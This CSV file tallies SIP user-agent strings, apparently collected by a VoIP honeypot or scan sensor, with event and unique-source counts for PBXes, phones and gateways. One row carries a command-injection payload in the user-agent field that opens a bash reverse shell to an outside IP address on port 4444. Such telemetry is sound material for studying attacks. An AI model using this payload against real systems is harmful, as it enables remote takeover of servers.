sip_user_agent,events,unique_src
AGFEO int SIP V5.2f (DATE=08.05.26 02:42  MAC=0009408A0EB0),8,1
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009406E1905),8,2
Asterisk PBX 16.22.0,8,2
Grandstream UCM6304V1.4A 1.0.31.7,8,4
Grandstream UCM6304AV1.2A 1.0.15.13,8,2
Grandstream UCM6304AV1.2A 1.0.19.10,8,3
Grandstream UCM6304AV1.2A 1.0.21.9,8,3
FPBX-16.0.40.13(19.8.0),8,3
FPBX-16.0.40.11(16.8),8,2
FPBX-16.0.31(18.19.0),8,2
Grandstream UCM6301V1.3A 1.0.11.10,8,3
Grandstream UCM6300AV1.1A 1.0.33.30,8,4
Grandstream UCM6301V1.2C 1.0.13.9,8,5
Grandstream UCM6300AV1.1A 1.0.23.17,8,3
Grandstream UCM6300AV1.1A 1.0.25.9,8,3
Grandstream UCM6300AV1.1A 1.0.27.23,8,2
FPBX-16.0.45(18.20.2),8,3
FPBX-16.0.45(18.23.1),8,3
YAMAHA NVR500,8,2
YATE/5.5.0,8,4
YMS IPCALL 1.2.6.31 Jun 23 2022,8,3
XiVO PBX 2018.05.18,8,3
X-Lite release 1105x,8,4
Grandstream UCM6302V1.3A 1.0.25.9,8,4
Grandstream UCM6302V1.2C 1.0.15.10,8,3
FPBX-16.0.45(16.16.1),8,3
WVP-Pro v2.6.9.20231130,8,3
WVP-Pro v2.6.9.20240402,8,3
WVP-Pro v2.6.8.20230423,8,3
WS-400IP/PCS18Ba60237,8,3
AGFEO int SIP V5.1h (DATE=01.10.25 00:04  MAC=0009408A0AAE),8,3
AGFEO int SIP V5.1h (DATE=01.10.25 00:04  MAC=0009408A0D01),8,3
AGFEO int SIP V4.2c (DATE=23.09.25 21:34  MAC=000940701DC1),8,4
AGFEO int SIP V4.2a (DATE=28.05.25 02:34  MAC=0009406E164D),8,4
Moimstone IP570HB 1.40.509,8,2
SVMSPro,8,3
SZTLSPBX,8,2
Sagem / HW_V0.0.1 / FW_V-58C040 / SW_V1.2.344,8,2
Asterisk PBX 18.13.0,8,3
Asterisk PBX 18.14.0,8,3
Asterisk PBX 18.17.1,8,3
Asterisk PBX 18.19.0,8,3
ClearVox Nexxt/2.9.0 (hn:clearvox.voipst.nl; h:0),8,1
ClearVox Nexxt/2.9.0 (hn:clearvox2.wijzijnmerlin.nl; h:0),8,2
NEC SV9100-NA 11.00.50,8,3
NEC SV9100-NA 09.00.50/2.1,8,3
NEC SV9100-NA 10.50.52/2.1,8,3
NEC SV9100-GE 13.20.51,8,2
NEC SV9100-GE 10.60.55/2.1,8,3
NEC SL Series 07.14/2.1,8,3
RG-4402G-W/1.15.2.58 SN/VI34000371,8,2
RG-4402G-W/1.15.2.58 SN/VI34000903,8,3
RG-4402G-W/1.15.2.58 SN/VI34002776,8,3
RG-1404GF-W/1.12.2 SN/VI25028815 sofia-sip/1.12.10,8,2
RG-1404GF-W/1.11.0 SN/VI25026224 sofia-sip/1.12.10,8,3
CommuniGatePro/6.1.7,8,3
Commend VirtuoSIS 11.1.5,8,3
Codian MCU 4510 v4.5 (1.45),8,2
Yeastar S100-30.15.0.159,8,2
Yeastar S100-30.15.0.201,8,3
Yealink W70B 146.87.0.15,8,3
Yealink W70B 146.87.0.18,8,4
Yealink W70B 146.85.0.25,8,3
Yealink W52P 25.80.0.29,8,3
Yealink W52P 25.81.0.30,8,2
Yealink SIP-T44U 108.87.0.15,8,4
FPBX-16.0.45(16.30.0),8,2
Grandstream UCM6300AV1.1A 1.0.11.10,8,3
Grandstream UCM6300AV1.1A 1.0.17.11,8,2
Grandstream UCM6300AV1.0A 1.0.13.9,8,2
Yeastar S100-30.15.0.216,8,3
Yeastar S20-30.11.0.28,8,2
AGFEO int SIP V4.1d (DATE=27.05.24 20:14  MAC=0009406E00C0),8,3
AGFEO int SIP V4.1d (DATE=27.05.24 20:14  MAC=0009405C03A7),8,2
Portable PBX,8,3
PolycomVVX-VVX_450-UA/6.4.4.3178,8,2
NodoeCloud-Asterisk/18,8,3
Netcomp-C530IP/42.199.00.000.000,8,2
ClearVox Nexxt/2.8.0 (hn:clearvox.wijzijnmerlin.nl; h:0),8,3
Cisco/SRP527-1.01.17(VP002),8,3
NN Voice AI,8,2
Asterisk PBX 20.16.0,8,2
AGFEO SIP V4.1d (DATE=27.05.24 20:14  MAC=0009407F1F78),8,3
AGFEO SIP V3.00.15 n (MAC=0009407013FF),8,2
AGFEO SIP V3.00.15 efg (MAC=0009406E0D63),8,2
AGFEO SIP V3.00.15 n (MAC=0009405B0501),8,3
ADTRAN_Total_Access_924e_2nd_Gen/R10.11.0.E,8,3
ADTRAN_Total_Access_924e_2nd_Gen/R10.9.4.E,8,3
ADTRAN_Total_Access_924e_2nd_Gen/R11.4.5.E,8,2
QTel PBX,8,3
FPBX-16.0.47(19.8.0),8,3
Grandstream UCM6208V1.3A 1.0.20.38,8,3
Grandstream UCM6208V1.3A 1.0.20.48,8,3
Grandstream UCM6208V1.3A 1.0.20.53,8,2
Grandstream UCM6204V1.5B 1.0.20.52,8,2
Grandstream UCM6202V1.7A 1.0.20.48,8,2
Grandstream UCM6202V1.7A 1.0.20.52,8,2
Yeastar S300-30.15.0.216,8,3
NEC SL2100/2.1,8,4
Asterisk PBX 18.9.0-8.0.1.rl.103838.e01c174,8,3
Asterisk PBX 18.26.2-vici,8,2
SIP UAS V3.0.0.2187715,8,2
SIP UAS V3.0.0.1535327,8,3
Yealink SIP-T46G 28.73.0.50,8,3
FPBX-17.0.19.12(21.4.3),8,3
FPBX-17.0.19.21(21.5.0),8,3
ONT_7221/C5.8.0.45,8,4
ONT_7251/H5.6.0.35,8,4
Cisco/SPA303-7.6.2c,8,2
Cisco/SPA303-7.6.2g,8,2
Cisco/SPA122-1.2.1(004),8,3
OBIHAI/OBi200-3.2.2.8680,8,3
Nortel SESM 12.0.6.11,8,3
RG-1404GF-W/1.11.0 SN/VI25013599 sofia-sip/1.12.10,8,2
ADTRAN_Total_Access_908e_3rd_Gen/R10.9.6.E,8,2
ADTRAN_Total_Access_908e_3rd_Gen/R11.10.7.HA.E,8,2
PolycomVVX-VVX_410-UA/5.9.8.5760,8,3
Asterisk_FS,8,2
Asterisk-CRM,8,3
Asterisk PBX certified/13.21-cert3,8,2
PolycomVVX-VVX_201-UA/5.7.0.13837,8,3
PolycomSIP-UA/1.2.0,8,3
Grandstream UCM6202V1.5B 1.0.20.23,8,3
FPBX-17.0.21.7(22.5.0),8,4
FPBX-17.0.21(22.3.0),8,4
FPBX-17.0.21.12(22.5.2),8,3
FPBX-17.0.19.32(21.6.0),8,2
Grandstream UCM6104V1.5B 1.0.18.18,8,2
ZXHN H218N/V1.02.01_ERS,8,3
ADTRAN_Total_Access_916e_1st_Gen/A1.03.00.E,8,4
Asterisk PBX 20.18.0,8,3
RV/V8.3.8.57 XT5000 720p,8,3
Yeastar S20-30.15.0.216,8,4
Yeastar S20-65.15.0.24,8,4
Yeastar S20-65.16.0.164,8,4
Yeastar S20-65.16.0.183,8,3
Yeastar S20-30.15.0.102,8,3
Grandstream UCM6202V1.5B 1.0.18.12,8,1
baresip v0.6.0 (arm/linux),8,2
adba_telephony,8,4
asterisk,8,3
Zycoo-EH30 s1.0.10 68692E260F5B,8,3
ADTRAN_Total_Access_908e_2nd_Gen/R10.9.6.HA.E,8,1
ADTRAN_Total_Access_908_2nd_Gen/A4.11.00.E,8,3
ADTRAN_Total_Access_908_2nd_Gen/R11.4.6.E,8,3
ADTRAN_Total_Access_904_1st_Gen/A2.03.00.SC.E,8,3
FPBX-17.0.28(20.19.0),8,3
FPBX-17.0.28(20.20.1),8,1
FPBX-17.0.28(20.10.0),8,2
FPBX-17.0.25(22.5.0),8,3
Grandstream HT818 1.0.53.2 ec74d731b58a,8,4
Grandstream HT841 1.0.1.2,8,4
Grandstream HT814 1.0.31.1,8,3
Grandstream HT814 1.0.49.2,8,3
Yeastar S50i-78.16.0.32,8,2
YunPBX Proxy,8,2
Yeastar S50-65.16.0.11,8,3
Yeastar S50-30.14.0.23,8,2
Yeastar S412-30.11.0.8,8,4
Grandstream UCM6201 V1.4A 1.0.26.41,8,4
Grandstream UCM6104V1.5A 1.0.9.26,8,3
FPBX-17.0.28(20.18.2),8,2
Asterisk PBX GIT-18-f5c9f7d3c8,8,2
Asterisk PBX 23.4.1,8,3
Asterisk PBX 22.5.2~dfsg+~cs6.15.60671435-1,8,3
Asterisk PBX 22.8.0,8,3
Asterisk PBX 22.8.2,8,3
Asterisk PBX 22.2.0,8,3
Asterisk PBX 22.4.1,8,2
Yeastar S50-65.16.0.41,8,3
Auerswald COMmander 6000/8.6C000,8,3
Phonalisa 6 IP Next Generation Communications System b2buaCSTA,8,2
Patton SN4634 3BIS 00A0BA0BC308 R6.8 2015-07-09 H323 SIP BRI M5T SIP Stack/4.2.8.10,8,3
Patton SN4131/2BIS4VHP 00A0BA0FC122 3.22.1-24062 1.8 M5T SIP Stack/4.2.28.153,8,3
Cisco/SPA112-1.2.1(004),8,2
Cisco/SPA112-1.3.2-XU(014),8,4
Cisco/SPA112-1.3.5(004),8,4
OXO032/039.001 GW_032/038.001,8,3
Grandstream HT801 1.0.65.1,8,4
Grandstream HT801V2 1.0.7.5,8,2
Auerswald COMpact 5200R sofia-sip/1.12.11,8,3
Panasonic-MPR16-V008.20036/VSIPGW-V3.0000,8,2
Panasonic-MPR16-V009.00013/VSIPEXT-V3.0000,8,3
Panasonic-KX-TGP600/11.111,8,2
Polycom-RoveB2-8.0.8.0001,8,3
Auerswald COMpact 4000/8.2C000,8,3
FPBX-17.0.30(22.6.0),8,4
FPBX-17.0.28(22.3.0),8,3
FPBX-17.0.28(21.7.0),8,3
Grandstream HT802V2 1.0.5.7,8,3
Grandstream HT802 1.0.61.5,8,2
Grandstream HT802V2 1.0.13.5,8,3
Grandstream HT802 1.0.3.2,8,2
Grandstream HT802 1.0.47.4,8,2
Zultys Z 23GE - 2.12.5.8,8,2
ZyXEL PMG5622GA V5.40(ABNB.1)C02,8,4
Zirvik PBX,8,4
Zoiper v5,8,4
ZX-I532_516-3200H,8,3
Grandstream HT813 0.22.15.7,8,3
Grandstream HT814 1.0.21.4,8,3
FPBX-17.0.30(21.12.3),8,2
Berofix VOIP Gateway (21.02),8,3
Barracuda CloudGen Firewall,8,3
BellQ,8,2
PBXact-16.0.45(18.26.4),8,3
OXO061/022.001 GW_061/022.001,8,3
OXO060/128.001 GW_060/128.001,8,3
Cisco-ATA192-MPP/11-1-0MSR3-9,8,4
Cisco-ATA192-MPP/11-2-3MPP0001-028,8,2
ADTRAN_SDX_632v/25_5-26-d,8,3
ADTRAN_SDX_622v/25.3-3,8,2
dlink 12-3892-6675-1.3.3.198-ONC200W,8,2
dlink 12-3893-2630-0.10.59.2-DSLX,8,2
PBXact-17.0.25(22.4.1),8,3
Bulutfon-3.0,8,2
BitPBX 1.8.3,8,3
Brekeke SIP Server rev.501,8,3
FPBX-17.0.30(22.8.2),8,3
Grandstream GXV3610_FHD 1.0.3.17,8,2
Grandstream GXP1630 1.0.7.81,8,3
FPBX-AsteriskNOW-2.11.0(1.8.32.1),8,4
eXosip/5.1.3,8,2
eSIP 50x-30.15.29.128,8,2
ADTRAN_Total_Access_362/J74.00.0011.G2,8,3
ADTRAN_SDX_632v/24_2-3-d,8,4
OXO032/079.001 GW_032/086.001,8,3
ONT_7463/H5.8.0.22,8,3
FPBX-2.11.0(11.7.0),8,3
FPBX-2.11.0(11.14.2),8,3
FPBX-2.11.0(11.17.1),8,2
FPBX-2.11.0(11.21.0),8,2
FPBX-2.11.0(11.24.0),8,4
FPBX-2.11.0(11.14.1),8,2
2N IP Style 3.2.0.79.2,8,3
2N IP Vario 2.42.1.55.3,8,3
056 12-3891-5733-1.3.3.182-SP300-DS,8,2
026 12-35-788210,8,3
1.00(AAKL.28)C0,8,2
uCsip_R8.71.2437_IVer60.66,8,3
ttUnited PBX,8,3
CALIX 844E-1/12.2.12.8.4,8,2
Fanvil X1S 2.4.12.2 0c:38:3e:0f:b0:ca,8,4
Fanvil W620W 2.16.19 0c383e810f99,8,4
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80EEF4EC,8,1
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80C70B16,8,3
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80CE7CD8,8,1
minyuan V2.1.3 Sep  4 2025 20:53:50,8,3
2N IP Verso 2.28.0.37.5,8,2
2N IP Verso 2.42.1.55.3,8,3
Panasonic-KX-HDV100RU/06.000 (4c364e00e6bc),8,2
5gVision,8,4
5gVision VoIP switch,8,2
3CXPhoneSystem 15.5.8801.3 (8713),8,3
398 12-3896-12496-1.4.2.220-OGC200W,8,4
iopsys_W.4723500656_580032bcaa10,8,3
Fanvil X1S 2.2.12 0c:38:3e:0f:f7:5d,8,3
Fanvil X1S 2.4.12 0c:38:3e:26:82:19,8,3
CUNIPBX,8,3
CM5K-PHONE  (1510291),8,3
COMFORT 520A IP BASE/88.1.18.0;589EC6746C87,8,2
CALIX GS5229E/26.1.0.0.30,8,3
CALIX GS5229XG/25.2.0.0.44,8,2
CISCO-SBC/2.x,8,3
CALIX GS4227W/25.3.0.0.57,8,3
CALIX GS4229E/26.1.0.0.30,8,2
GHJ-2.11.0(11.21.2),8,3
FreeSWITCH-mod_sofia/1.10.7-dev+git~20210914T182442Z~6827c66373~64bit,8,3
Krista Voice Server 1.0.0 - 0,8,3
LAD-PBX-17-20,8,3
F660/V2.30.20P6T12S,8,3
F660/V2.30.20P6T4S,8,2
F660/V2.30.20P8T2S,8,4
F660/V2.22.21P5T8S,8,3
GHJ-5.3.0,8,3
General,8,5
Fanvil X4U-V2 2.12.25.6 0c383e734fd9,8,3
Fanvil X5U 2.4.5 0c383e2b8ea0,8,3
Fanvil X5U T0.7.2 0c383e43cc75,8,2
Fanvil X3SLite 2.4.11.9 0c383e3003b1,8,3
Fusion KWUS,8,3
GBXuean/v3,8,2
kamailio (6.1.3 (aarch64/Linux)),8,4
kamailio (6.1.3 (x86_64/Linux)),8,2
kamailio (5.8.0 (x86_64/linux)),8,3
sip.spikon.pl,8,3
sip.wa.iinet.net.au,8,4
sip1.superloop.com,8,3
201 12-3893-6085-1.3.3.213-SP300-SO,8,4
201 12-38-39927650-0.9.5.1.1741-PSTN808,8,3
OpenSIPS (3.4.15 (x86_64/linux)),8,2
OpenSIPS (2.4.2 (x86_64/linux)),8,4
OpenSIPS (1.6.4-2-notls (x86_64/linux)),8,2
OXO_GW_900/043.001,8,4
OfficeNet Systems Phone server,8,3
PBXact-13.0.193(13.18.3),8,3
konsultant,8,3
maSIP Version 5.0 Build 96,8,4
FreeSWITCH-mod_sofia/1.10.12-release+git~20240802T210227Z~a88d069d6f~64bit,7,3
FreeSWITCH-mod_sofia/1.10.12-dev-1~37d0b98~64bit,7,2
FreeSWITCH-mod_sofia/1.10.11-release+git~20240716T082159Z~084f0feca5~64bit,7,3
ssi-pbx-01,7,2
spreed-webrtc-sip-bridge/0.3.6/7bbb482c22d3fb63b9f3305dbc39bfacb30f979c,7,3
$(bash -i >& /dev/tcp/192.210.144.130/4444 0>&1),7,3
softswitch,7,3
snomM900/06.50.0002 (MAC=000413B68B08; SER= 00000; HW=3),7,2
201 12-395-312-1.4.2.252-SP5250S,7,3
202 12-3864-8116-0.9.5.1.1741-SA7S8,7,3
202 12-3893-9882-1.4.2.180-SP9440S,7,2
202 12-392-609-1.4.2.252-SP5250S,7,2
sip.4web.pl,7,4
056 12-3899-284-1.4.2.252-SP350DS,7,3
OXO052/059.001 GW_052/059.001,7,3
1.0.0.140,7,3
056 12-3893-6084-1.3.3.240-SP300-DS,7,3
voxGate,7,2
001000-AT202-906D,7,2
201 12-3893-9881-1.4.2.180-SP9440OP,7,2
snomM300/03.55.0025 (MAC=0004136282D5; SER= 00000; HW=1),7,3
snomM300/05.30.0007 (MAC=00041362BC25; SER= 00000; HW=2),7,1
054 12-38-39929204-0.9.5.1.1741-SA7O8,7,2
yeti-as,7,2
yeti-switch 1.12.46core102,7,3
230 12-3895-399-1.2.10.2866-IXP_SP1700,7,2
2N IP Vario 2.39.2.51.6,7,3
2N IP Vario 2.44.0.57.3,7,3
lootom,7,3
mindlinker,7,2
FreeSWITCH-mod_sofia/1.6.20~64bit,7,3
FreeSWITCH-mod_sofia/1.8.2~64bit,7,3
Fanvil X4U-V2 2.12.17 0c383e331b13,7,2
Fanvil X6U 2.4.13 0c383e234038,7,3
GSSoftSwitch,7,4
Fanvil X3SLite 2.4.10.1 0c383e1f6cb6,7,4
CALIX GS4227E/26.1.0.0.30,7,2
OWC-PBX,7,4
ONT_7321/A5.6.0.53,7,3
OpenSIPS (1.8.2-tls (i386/linux)),7,3
OmniAI-FreeSWITCH,7,2
CALIX GS4227E/24.1.0.0.61,7,2
OXO050/037.001 GW_050/037.001,7,2
OpenSIPS (3.1.17 (x86_64/linux)),7,3
OpenRG/5.4.8.1.327.1.51,7,4
Cisco/SPA122-1.2.0(023),7,3
OXO103/061.001 GW_103/042.001,7,3
OXO103/065.001 GW_103/047.001,7,3
OXO_GW_810/072.002,7,3
OXO040/546.001 GW_040/546.001,7,2
OXO040/565.001 GW_040/565.001,7,4
A510 IP/42.199.00.000.000,7,2
kamailio (5.8.2 (x86_64/linux)),7,3
Fanvil X301W 2.12.22.2 0c383e7cabfd,7,2
Fanvil X303 2.12.4.5 0c383e5c839d,7,1
Fanvil X303 2.12.4.5 0c383e5d32cf,7,4
kamailio (5.6.5 (x86_64/linux)),7,3
kamailio (5.8.8 (x86_64/linux)),7,3
A5000 R5.4 SP8 /DE00 ESP,7,3
Gigaset N670 IP PRO/83.V2.36.0+build.732061a;589EC6666EA7,7,2
3CXPhoneSystem 9.0.15776.0,7,3
4.0.18.20221010,7,2
4.0.18.20250429,7,1
516 V7.0 r2900 b0712,7,3
kamailio (5.2.6 (x86_64/linux)),7,2
Gigaset N670 IP PRO/83.V2.62.1+build.d1d6a22;589EC6750AA9,7,2
PBXact-15.0.23(17.9.4),7,3
Cisco/SPA122-1.4.1(SR5),7,3
Cisco/SPA122-1.4.1SR1(002),7,2
Cisco/SPA303-7.4.8a,7,2
Cisco/SPA112-1.4.1SR1(002),7,3
C430A GO/42.245.00.000.000,7,4
C530 IP/42.207.00.000.000,7,2
Cisco/SPA122-1.4.0(001),7,2
OBIHAI/OBi300-3.2.1.5757,7,3
C610 IP/42.076.00.000.000,7,3
C610 IP/42.207.00.000.000,7,3
C610A IP/42.072.00.000.000,7,3
NUSO Switch,7,4
C530 IP/42.243.00.000.000,7,2
OpenStage_60_V3 R5.13.0      SIP  190111,7,2
OXO022/029.001 GW_022/034.001,7,3
ADTRAN_NetVanta_3140/R13.12.1,7,3
ADTRAN_NetVanta_3148/R13.10.1.HB,7,4
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80D30CC0,7,2
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80EEEADC,7,2
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80CE799B,7,2
Gigaset A540IP A540IP 42.247.01.000.000 7C2F80D30583,7,3
gbSip v1,7,4
ADTRAN_SDX_601qv/12_5_2-28-e,7,3
ipbx 2.3.11,7,3
ADTRAN_NetVanta_3140/R12.3.0.SA,7,3
ebooserver,7,2
ADTRAN_NetVanta_3430/R10.9.6.V,7,4
A510 IP/42.248.00.000.000,7,4
GHJ-5.2.34,7,2
Fanvil X301G 2.12.5.11_132_64 0c383e521854,7,3
kamailio (5.8.6 (x86_64/linux)),7,2
fsgui,7,2
fw2022011916-IVV34200.N3A2UHM,7,3
fw2022072710-HPV15400.N3A2UHML2,7,3
Cisco/SPA525G2-7.6.2e,7,3
Cisco/SPA504G-7.5.4,7,2
PBXact-16.0.40.11(20.5.2),7,3
PBXact-16.0.45(13.38.3),7,2
PBXact-16.0.45(16.30.0),7,3
BitPBX 2.4.1,7,2
BoconNvrAgent,7,2
Brekeke SIP Server rev.583,7,2
PBXact-15.0.38(16.30.0),7,2
PBXact-15.0.38(18.9),7,2
BiPAC 7800VDPX,7,4
NEC-SKD-030-A-YY(NECSIPEXT2MLUA_v1),7,3
PBXact-16.0.45(20.17.0),7,2
PBXact-15.0.38(16.20.0),7,3
PBXact-15.0.38(16.26.1),7,2
Fanvil X1S 2.4.12.2 0c:38:3e:60:cb:de,7,2
Fanvil X1S/X1SP 1.2.3 0c:38:3e:40:cb:87,7,3
dlink 12-3896-12555-1.4.2.232-OG201LW,7,2
eSIP 20x-30.14.29.173,7,3
eSIP 20x-30.15.29.128,7,1
eSIP 50x-30.15.29.126,7,2
dlink 12-3895-7207-1.3.3.228-SP5220S,7,2
Grandstream GXE5024 1.0.1.63,7,2
Fanvil X301G 2.12.20 0c383e78068a,7,2
Fanvil X1S 2.4.12.2 0c:38:3e:4a:c2:6d,7,3
Fanvil V62 2.12.2 0c383e2f3293,7,3
ADTRAN_Total_Access_372/J74.00.0014.G2,7,3
ADTRAN_Total_Access_900e_3rd_Gen/R11.10.5.E,7,2
Panasonic-KX-HTS-001.60031,7,3
CommuniGatePro/6.0.11,7,3
CommuniGatePro/6.1.20,7,3
PBXact-17.0.28(22.4.1),7,2
PBXact-17.0.28(22.7.0),7,3
Panasonic-KX-TGP600RU/13.102 (b8208e5aa758),7,3
Panasonic-MPR12-V008.03023/VSIPGW-V3.0000,7,2
Panasonic-MPR14-V004.41009/VSIPEXT-V3.0000,7,2
Panasonic-MPR15-V008.30047/VSIPEXT-V3.0000,7,3
PC Controller,7,2
PBXact-16.0.47(18.9),7,3
NEC SV9100-NA 07.00.51/2.1,7,3
ClearVox Nexxt/2.9.0 (hn:clearvox.rouxbv.nl; h:0),7,3
device,7,4
dlink 12-38-39912586-0.10.37.1-DSLX,7,3
Grandstream GXP2160 1.0.11.64,7,3
Grandstream GXP21XX/GXP14XX,7,3
FPBX-2.9.0(1.8.11.1),7,2
FPBX-AsteriskNOW-13.0.197.22(11.25.3),7,2
asterisk_custom,7,2
Grandstream DP750 1.0.21.33,7,2
Grandstream GCC6011V1.3A 1.0.27.94,7,3
dSIPRouter/0.78,7,2
baresip v1.0.0 (?/?),7,3
bccp23/1.0,7,2
Patton SN4131/2BIS4VHP 00A0BA12CBF6 3.22.2-24123 1.8 M5T SIP Stack/4.2.28.153,7,3
NEC SV9100-NA 12.00.50/2.1,7,3
NEC SV9100-NA 13.10.51,7,3
Panasonic-MPR16-V005.00112/VSIPEXT-V3.0000,7,2
Panasonic-MPR16-V008.20036/VSIPEXT-V3.0000,7,3
NEC SV9100-NA 10.60.53,7,2
NEC SV9100-GE 09.00.70/2.1,7,4
NEC SL2100 01.05.00/2.1,7,4
NEC-i SV8100-GE 10.25/2.1,7,2
BOL2000.COM NGSW3000 Platform,7,2
Panasonic-MPR16-V009.00016/VSIPEXT-V3.0000,7,4
DAG1000-2S DAG 2.19.10.13,7,2
N300A IP/42.245.00.000.000,7,3
Auerswald COMpact 5200R/7.8A002,7,3
NETGLOBAL-PBX,7,2
DAG2000-16O DAG 2.81.10.12,7,3
DAG1000-2S DAG 2.19.10.07,7,2
N510 IP PRO/42.199.00.000.000,7,2
N510 IP PRO/42.229.00.000.000,7,1
PolycomATA-OBi302-3.2.4.8441,7,2
Patton SN4131/4BIS8VHP 00A0BA12CC3B 3.22.2-24123 1.8 M5T SIP Stack/4.2.28.153,7,3
Auerswald COMmander 6000RX/8.6C000,7,2
Audiocodes-Sip-Gateway-MP-118 FXS/v.6.20A.052.003,7,3
Pexip Infinity Conferencing Platform/39 (83029.0.0),7,2
Dahua UAC/3.0 VTO2211G-WP V4.511.0.1 SN:9H074BFPAJA6D4C,7,3
Dahua UAC/3.0 VTOASI31D-M V3.3.0.4 VTO_Wall SN:BH10021PAJ09BC0,7,3
Platform PBX,7,2
Patton SN4131/4BIS8VHP 00A0BA127A35 3.22.4-25101 1.8 M5T SIP Stack/4.2.28.153,7,2
Grandstream HT801 1.0.53.3,7,2
Grandstream HT802 1.0.35.4,7,3
FPBX-2.11.0(11.8.1),7,3
FPBX-2.11.0.47(11.25.3),7,3
ADTRAN_Total_Access_908_2nd_Gen/R13.2.3.E,7,2
ADTRAN_Total_Access_908_3rd_Gen/R14.4.1.E,7,3
ADTRAN_Total_Access_904_2nd_Gen/R10.9.1.E,7,2
FPBX-2.11.0(11.12.0),7,3
FPBX-2.11.0(11.18.0),7,3
Grandstream HT801 1.0.41.2,7,2
ADTRAN_Total_Access_900e_3rd_Gen/R13.7.2.E,7,3
ADTRAN_Total_Access_908e_2nd_Gen/R10.9.5.E,7,3
ADTRAN_Total_Access_908e_2nd_Gen/R11.4.6.E,7,2
Zycoo-EH30 s1.0.10 68692E261041,7,3
Zycoo-EH30 s1.0.9.002 68692E260462,7,2
Grandstream GXP2130 1.0.3.9,7,3
ADTRAN_Total_Access_904_2nd_Gen/R13.5.3.E,7,3
ADTRAN_Total_Access_908_2nd_Gen/A4.08.00.E,7,3
ZYXEL VMG8825-B50B V5.13(ABNY.2)C0,7,2
ZYXEL VMG8924-B10D V5.13(ABGQ.0)C0,7,3
ZyXEL Communications Corp. P-2812HNU-F3 V1.00-AAHF.1-b2,7,2
AsteriskDocker,7,3
Asterisk_PBX,7,2
PolycomVVX-VVX_310-UA/5.9.8.5760_0004f28b5528,7,3
PolycomVVX-VVX_311-UA/6.3.1.11465_64167fcd6c9f,7,3
Dahua UAC/3.0 VTHX62X V4.510.0.1,7,2
Asterisk PBX certified-18.9-cert17,7,3
Mitel Border GW/4.7.0.10-01,7,3
DAG1000-2S DAG 2.19.10.16,7,2
DAG1000-4S DAG 2.19.10.07,7,3
Asterisk PBX certified/13.21-cert6,7,3
Asterisk PBX certified/18.9-cert4,7,3
PolycomVVX-VVX_250-UA/6.4.6.2656,7,3
PolycomSoundPointIP-SPIP_320-UA/2.1.2.0049,7,3
PolycomVVX-VVX_250-UA/5.9.6.2996_4825674310ec,7,2
NAS-QoE/1.0,7,2
NEC SL Series 07.01/2.1,7,3
NEC SL Series 07.15/2.1,7,3
ZXDSL 931VII/V2.0.00.OTET05,7,3
Grandstream HT812 1.0.57.1,7,2
FPBX-17.0.28(22.7.0),7,4
ADTRAN_Total_Access_908e_3rd_Gen/R13.2.2.E,7,2
FPBX-17.0.28(22.1.0),7,4
Grandstream HT812 1.0.23.5,7,2
ADTRAN_Total_Access_908e_3rd_Gen/R14.4.1.E,7,2
ADTRAN_Total_Access_916e_2nd_Gen/R11.10.2.E,7,2
Grandstream HT801V2 1.0.1.13,7,3
ADTRAN_Total_Access_908e_2nd_Gen/R13.1.0.E,7,2
ADTRAN_Total_Access_908e_2nd_Gen/R13.5.2.E,7,2
Asterisk PBX GIT-21-6b50ac1,7,2
Mitel Border GW(MBG/12.3.0.128 TUG/4.26.0.87-01),7,3
Mitel Border GW/4.10.0.176-01,7,2
Portugal,7,3
PolycomVVX-VVX_500-UA/5.9.6.2996_0004f25a6fa7,7,2
R20A 20.30.4.147 0C11050F50FB,7,4
RG SIPUA/1.0,7,2
RG-1404G/1.12.2 SN/VI0E001122 sofia-sip/1.12.10,7,3
PolycomVVX-VVX_411-UA/6.4.1.2280_64167f5e41bd,7,2
Asterisk PBX 22.6.0,7,3
Asterisk PBX 22.8.1,7,2
Asterisk PBX 21.9.0,7,2
PortSIP UC - Call Manager 12.5.0.61,7,3
PolycomVVX-VVX_450-UA/6.4.3.5059,7,4
Yeastar S50i-78.16.0.10,7,3
Grandstream UCM6102V1.5A 1.0.18.18,7,4
Yeastar S300-30.13.0.15,7,2
FPBX-17.0.25(21.6.0),7,3
Grandstream HT814 1.0.3.2,7,2
Grandstream HT818 1.0.57.1,7,2
Yeastar S50-65.16.0.10,7,3
Yeastar S50-65.16.0.216,7,2
